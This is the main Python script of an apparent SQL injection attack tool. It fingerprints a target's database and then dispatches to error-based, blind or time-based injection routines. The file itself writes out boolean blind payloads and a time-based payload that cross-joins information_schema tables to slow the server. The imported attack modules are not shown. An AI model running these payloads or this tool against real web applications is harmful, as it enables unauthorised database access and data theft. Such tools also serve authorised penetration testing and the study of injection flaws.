# -*- coding: utf-8 -*-

import httplib
import urllib
from urlparse import urlparse
import sys
import argparse
import blind_sql as blind
import time_sql as time
import error_sql as error
import setting as set
import dbms_ck as dbck
import log as log
import intro as intro

def check_blind_time(dbms):
    if set.caller_blind_httpreq("' and '1'='1") == 1 and set.caller_blind_httpreq("' and '1'='2") == 0:
        log.print_based_log("Blind Based Injection")
        blind.blind_based_sql(dbms)
    elif set.caller_time_httpreq("' and case when 1=2 then 1 else(select count(*) from information_schema.columns col1,information_schema.tables tab1,information_schema.tables tab2)end%23") == 0:
        log.print_based_log("Time Based Injection")
        time.time_based_sql(dbms)

intro.print_logo()

dbms, finger_scan, finger_error = dbck.check_dbms()
log.print_db_log(dbms)



if finger_error:
    log.print_based_log("Error Based Injection")
    error.error_based_sql(dbms)

elif finger_scan:
    log.info("Proper Injection testing")
    check_blind_time(dbms)

elif dbms == -1:
    log.info("Proper Injection testing")
    check_blind_time(dbms)


